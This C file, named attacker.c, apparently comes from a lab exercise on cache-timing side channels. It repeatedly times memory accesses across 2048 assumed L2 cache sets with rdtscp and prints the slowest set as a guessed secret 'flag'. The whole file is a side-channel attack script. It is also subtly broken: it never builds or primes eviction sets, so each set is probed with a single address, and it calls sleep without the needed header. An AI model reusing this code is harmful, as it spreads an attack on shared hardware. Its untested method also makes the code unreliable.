// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "util.h"  // Provided utility functions

#define NUM_SETS 2048  // Number of L2 cache sets in Skylake (example)
#define SAMPLE_COUNT 100  // Number of measurements to average per set

uint64_t probe_one_set(uint8_t *buffer, int set_index) {
    uint64_t start, end, delta;
    volatile uint8_t *addr;

    addr = buffer + (set_index << 6);  // Multiply by cache line size (64B)
    start = rdtscp64();
    *addr;  // Access
    end = rdtscp64();
    delta = end - start;
    return delta;
}

int main() {
    uint8_t *buffer = get_buffer();  // Already hugepage allocated
    if (buffer == NULL) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    printf("Attacker started...\n");

    uint64_t times[NUM_SETS];

    while (1) {
        // Initialize latency table
        for (int i = 0; i < NUM_SETS; i++) {
            times[i] = 0;
        }

        // Probe all sets
        for (int sample = 0; sample < SAMPLE_COUNT; sample++) {
            for (int i = 0; i < NUM_SETS; i++) {
                times[i] += probe_one_set(buffer, i);
            }
        }

        // Find set with maximum latency
        int flag = -1;
        uint64_t max_latency = 0;
        for (int i = 0; i < NUM_SETS; i++) {
            if (times[i] > max_latency) {
                max_latency = times[i];
                flag = i;
            }
        }

        printf("Guessed flag: %d\n", flag);

        sleep(1); // Wait a bit before next guess
    }

    return 0;
}
